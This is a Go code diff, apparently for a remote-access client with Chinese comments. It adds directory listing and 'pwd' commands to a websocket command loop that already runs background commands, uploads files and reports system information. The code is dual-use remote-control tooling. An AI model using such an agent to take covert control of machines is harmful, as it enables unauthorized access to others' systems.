@@ -153,6 +153,38 @@ func (e *ExecuteCommand) execute_bg_command(command string) {
 	_ = cmd.Start()
 }
 
+// 获取当前文件列表
+func (e *ExecuteCommand) get_file_list() map[string]interface{} {
+	file_json := map[string]interface{}{
+		"error":       "",
+		"directories": []map[string]interface{}{},
+		"files":       []map[string]interface{}{},
+	}
+	file_list, err := os.ReadDir(".")
+	if err != nil {
+		file_json["error"] = err.Error()
+		return file_json
+	}
+	for _, file := range file_list {
+		file_info, err := file.Info()
+		if err != nil {
+			file_json["error"] = fmt.Sprintf("%s%s\n", file_json["error"], err.Error())
+		}
+		file_map := map[string]interface{}{
+			"name":      file_info.Name(),
+			"mode_time": file_info.ModTime().String(),
+			"mode":      file_info.Mode().String(),
+			"size":      file_info.Size(),
+		}
+		if file.IsDir() {
+			file_json["directories"] = append(file_json["directories"].([]map[string]interface{}), file_map)
+		} else {
+			file_json["files"] = append(file_json["files"].([]map[string]interface{}), file_map)
+		}
+	}
+	return file_json
+}
+
 // 更改当前工作目录
 func (e *ExecuteCommand) change_directory(directory string) string {
 	err := os.Chdir(directory)
@@ -178,8 +210,8 @@ func (e *ExecuteCommand) upload_file(file_path string, contents string) string {
 	} else {
 		// Open or create the file with write permissions
 		// 增加重试机制是为了解决Windows上文件被占用的问题，等待占用的锁被释放
-		retry_code:
-			file, err := os.OpenFile(file_path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	retry_code:
+		file, err := os.OpenFile(file_path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 		if err != nil {
 			if retry > 3 {
 				message = err.Error()
@@ -271,6 +303,20 @@ func client_loop() {
 				// 获取系统信息
 				system_info := Executecommand.get_systeminfo()
 				if err := conn.WriteJSON(system_info); err != nil {
+					conn.Close()
+					break
+				}
+			} else if command == "ls" {
+				// 列出当前目录下的文件
+				file_list := Executecommand.get_file_list()
+				if err := conn.WriteJSON(file_list); err != nil {
+					conn.Close()
+					break
+				}
+			} else if command == "pwd" {
+				// 获取当前工作目录
+				current_directory, _ := os.Getwd()
+				if err := conn.WriteMessage(websocket.TextMessage, []byte(current_directory)); err != nil {
 					conn.Close()
 					break
 				}
